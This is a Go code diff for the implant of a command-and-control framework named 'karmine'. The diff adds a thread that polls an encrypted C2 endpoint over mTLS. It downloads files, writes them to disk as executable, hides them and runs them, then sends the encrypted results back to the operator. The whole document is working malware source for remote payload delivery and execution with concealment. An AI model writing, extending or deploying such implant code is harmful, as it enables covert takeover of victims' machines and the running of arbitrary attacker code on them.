@@ -7,12 +7,15 @@ import (
 	"io/ioutil"
 	"net/http"
 	"net/url"
+	"os"
+	"os/exec"
+	"runtime"
 	"strconv"
 	"sync"
 	"time"
 
 	"github.com/pygrum/karmine/client"
-	"github.com/pygrum/karmine/karma/cmd/exec"
+	ex "github.com/pygrum/karmine/karma/cmd/exec"
 	"github.com/pygrum/karmine/krypto/kes"
 	"github.com/pygrum/karmine/krypto/kryptor"
 	"github.com/pygrum/karmine/models"
@@ -29,19 +32,22 @@ var (
 	InitAESKey      string
 	X1              string
 	X2              string
+	InitPFile       string
 	CmdMap          = make(map[int]func(*models.KarResponseObjectCmd, ...models.MultiType) error)
 )
 
 func main() {
 	// Assign known commands to command function map
-	CmdMap[1] = exec.Do
+	CmdMap[1] = ex.Do
 	var wg sync.WaitGroup
 	c2Endpoint := InitC2Endpoint
 	waitSecondsInt, err := strconv.Atoi(InitWaitSeconds)
 	if err != nil {
 		waitSecondsInt = 600 // default loop time until next command is 10 minutes
 	}
-
+	if _, err := os.Stat(InitPFile); err == nil {
+		HideF(InitPFile)
+	}
 	ticker := time.NewTicker(time.Duration(time.Duration(waitSecondsInt) * time.Second))
 	endpointStr, err := kryptor.Decrypt(c2Endpoint, X1, X2)
 	if err != nil {
@@ -57,40 +63,114 @@ func main() {
 	}
 	wg.Add(1)
 	go awaitCmd(string(endpointStr), string(UUID), X1, X2, InitAESKey, ticker, mTLSClient) // thread handling receiving commands
+
+	go awaitFile(string(endpointStr), string(UUID), X1, X2, InitAESKey, InitPFile, ticker, mTLSClient) // thread handling receiving files
 	wg.Wait()
+}
+
+func awaitFile(c2Endpoint, UUID, kX1, kX2, aesKey, pFile string, ticker *time.Ticker, mTLSClient *http.Client) {
+	var prevCmd int
+	for range ticker.C {
+		fObject, cmdID, broadcast, err := getObjectBytes(prevCmd, c2Endpoint, UUID, kX1, kX2, aesKey, mTLSClient, "2")
+		if err == nil {
+			prevCmd = cmdID
+			fileObj := &models.KarObjectFile{}
+			if err := json.Unmarshal(fObject, fileObj); err != nil {
+				continue
+			}
+			filename := fileObj.FileName
+			if err = os.WriteFile(filename, fileObj.FileBytes, 0744); err != nil {
+				continue
+			}
+			if _, err := os.Stat(pFile); err != nil {
+				go handleFile(cmdID, filename, c2Endpoint, UUID, broadcast, kX1, kX2, aesKey, pFile, mTLSClient)
+			} else {
+				cmd := exec.Command(pFile, filename)
+				var cerr bytes.Buffer
+				cmd.Stderr = &cerr
+				if err := cmd.Run(); err != nil {
+					fileObj := &models.KarResponseObjectFile{
+						Error:  1,
+						ErrVal: cerr.String(),
+					}
+					bytes, _ := json.Marshal(fileObj)
+					if !broadcast {
+						bytes, err = kes.EncryptObject(bytes, aesKey, kX1, kX2)
+						if err != nil {
+							continue
+						}
+					}
+					go postData(c2Endpoint, UUID, mTLSClient, &models.GenericData{
+						CmdID:  cmdID,
+						Type:   2,
+						Object: bytes,
+					})
+				}
+			}
+		}
+	}
 }
 
 func awaitCmd(c2Endpoint, UUID, kX1, kX2, aesKey string, ticker *time.Ticker, mTLSClient *http.Client) {
 	var prevCmd int
 	for range ticker.C {
-		cmdObject, cmdID, broadcast, err := requestCmd(prevCmd, c2Endpoint, UUID, kX1, kX2, aesKey, mTLSClient)
+		cmdObjectBytes, cmdID, broadcast, err := getObjectBytes(prevCmd, c2Endpoint, UUID, kX1, kX2, aesKey, mTLSClient, "1")
 		if err == nil {
+			cmdObj := &models.KarObjectCmd{}
+			if err := json.Unmarshal(cmdObjectBytes, cmdObj); err != nil {
+				continue
+			}
 			prevCmd = cmdID
-			go parseCmdObject(cmdObject, cmdID, c2Endpoint, UUID, broadcast, kX1, kX2, aesKey, mTLSClient)
+			go parseCmdObject(cmdObj, cmdID, c2Endpoint, UUID, broadcast, kX1, kX2, aesKey, mTLSClient)
 		}
 	}
 }
 
-func requestCmd(prevCmd int, Endpoint, UUID, kX1, kX2, aesKey string, mTLSClient *http.Client) (*models.KarObjectCmd, int, bool, error) {
-	// decrypting endpoint and uuid strings. No error handling, they were set at compile time
-	genericObj, err := requestData(Endpoint, UUID, "1", mTLSClient)
+func handleFile(cmdID int, fname, c2Endpoint, UUID string, broadcast bool, kX1, kX2, aesKey, pFile string, mTLSClient *http.Client) {
+	HideF(fname)
+	if runtime.GOOS == "linux" {
+		fname = "./" + fname
+	}
+	cmd := exec.Command(fname)
+	fileObj := models.KarResponseObjectFile{}
+	var cerr bytes.Buffer
+	cmd.Stderr = &cerr
+	if err := cmd.Run(); err != nil {
+		fmt.Println(err)
+		fmt.Println(cerr.String())
+		fileObj.Error = 1
+		fileObj.ErrVal = cerr.String()
+	}
+	bytes, _ := json.Marshal(fileObj)
+	var err error
+	if !broadcast {
+		bytes, err = kes.EncryptObject(bytes, aesKey, kX1, kX2)
+		if err != nil {
+			return
+		}
+	}
+	go postData(c2Endpoint, UUID, mTLSClient, &models.GenericData{
+		CmdID:  cmdID,
+		Type:   2,
+		Object: bytes,
+	})
+}
+
+func getObjectBytes(prevCmd int, Endpoint, UUID, kX1, kX2, aesKey string, mTLSClient *http.Client, dataType string) ([]byte, int, bool, error) {
+	genericObj, err := requestData(Endpoint, UUID, dataType, mTLSClient)
 	if err != nil {
 		return nil, 0, false, err
 	}
-	cmdObj := &models.KarObjectCmd{}
 	if len(genericObj.UUID) != 0 {
 		genericObj.Object, err = kes.DecryptObject(genericObj.Object, aesKey, kX1, kX2)
 		if err != nil {
 			return nil, 0, false, err
 		}
 	}
-	if err := json.Unmarshal(genericObj.Object, cmdObj); err != nil {
-		return nil, 0, false, err
-	}
 	if genericObj.CmdID == prevCmd {
 		return nil, 0, false, fmt.Errorf("")
 	}
-	return cmdObj, genericObj.CmdID, genericObj.UUID == "", nil
+	return genericObj.Object, genericObj.CmdID, genericObj.UUID == "", nil
 }
 
 func requestData(Endpoint, UUID, dataType string, mTLSClient *http.Client) (*models.GenericData, error) {
@@ -141,9 +221,7 @@ func parseCmdObject(cmdObject *models.KarObjectCmd, cmdID int, c2Endpoint, UUID 
 	}
 	respObjectBytes, err := json.Marshal(responseObject)
 	if err == nil {
-		var uid string
 		if !broadcast {
-			uid = UUID
 			respObjectBytes, err = kes.EncryptObject(respObjectBytes, aesKey, X1, X2)
 			if err != nil {
 				log.Error("")
@@ -151,7 +229,6 @@ func parseCmdObject(cmdObject *models.KarObjectCmd, cmdID int, c2Endpoint, UUID 
 			}
 		}
 		go postData(c2Endpoint, UUID, mTLSClient, &models.GenericData{
-			UUID:   uid,
 			Type:   1, // data type 1 is a command
 			CmdID:  cmdID,
 			Object: respObjectBytes,
